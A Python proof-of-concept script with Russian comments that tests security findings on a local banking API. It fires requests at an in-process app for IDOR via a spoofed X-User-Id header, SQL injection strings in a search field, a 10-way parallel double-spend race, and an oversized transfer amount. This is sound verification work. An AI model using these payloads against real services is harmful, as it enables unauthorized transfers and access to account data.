# PoC-проверка находок на запущенном сервисе (PostgreSQL 16 + fakeredis)
# имена user_id/TransferIn/TxOut подставляются только здесь т.к. в main.py они импортируются под неверными именами
import os, asyncio
os.environ['POSTGRES_DSN']='postgresql://postgres@localhost:5432/bank'
os.environ['REDIS_URL']='redis://localhost:6379/0'
import app.security as s, app.schemas as sc
s.user_id=s.get_current_user_id; sc.TransferIn=sc.TransferRequest; sc.TxOut=sc.TransactionOut
import fakeredis.aioredis as fr, app.redis_client as rc
rc._client=fr.FakeRedis(decode_responses=True)
from app.main import app
from app.db import init_db, get_pool
import httpx
async def main():
    await init_db()
    pool=await get_pool()
    T=httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=T, base_url='http://t') as c:
        bal=lambda: pool.fetch("select id,owner_user_id,balance_cents from accounts order by id")
        print('START', [tuple(r) for r in await bal()])
        # 1. user 2 легитимно пытается списать со счёта 1 под своим id
        r=await c.post('/transfer',headers={'X-User-Id':'2'},json={'from_account_id':1,'to_account_id':2,'amount_cents':1000})
        print('1) user2 as himself, from acc1:', r.status_code, r.text)
        # 2. IDOR: user 2 подставляет X-User-Id: 1
        r=await c.post('/transfer',headers={'X-User-Id':'1'},json={'from_account_id':1,'to_account_id':2,'amount_cents':1000})
        print('2) spoofed X-User-Id:1:', r.status_code, r.text)
        r=await c.get('/transactions',headers={'X-User-Id':'1'})
        print('3) history of user1 via spoofed header:', r.status_code, r.text[:200])
        # 4. SQLi попытки
        for p in ["' OR '1'='1", "1' UNION SELECT 1,2,3,4,now()--", "%"]:
            r=await c.get('/transactions',headers={'X-User-Id':'2'},params={'search':p})
            print('4) search=',repr(p), r.status_code, r.text[:150])
        # 5. race: 10 parallel transfers of full balance of acc2
        b2=(await pool.fetchval("select balance_cents from accounts where id=2"))
        rs=await asyncio.gather(*[c.post('/transfer',headers={'X-User-Id':'2'},json={'from_account_id':2,'to_account_id':1,'amount_cents':b2}) for _ in range(10)])
        print('5) race: balance acc2 before', b2, 'statuses', [x.status_code for x in rs])
        print('END', [tuple(r) for r in await bal()])
        # 6. целочисленное переполнение
        r=await c.post('/transfer',headers={'X-User-Id':'1'},json={'from_account_id':1,'to_account_id':2,'amount_cents':10**20})
        print('6) huge amount:', r.status_code, r.text[:120])
asyncio.run(main())
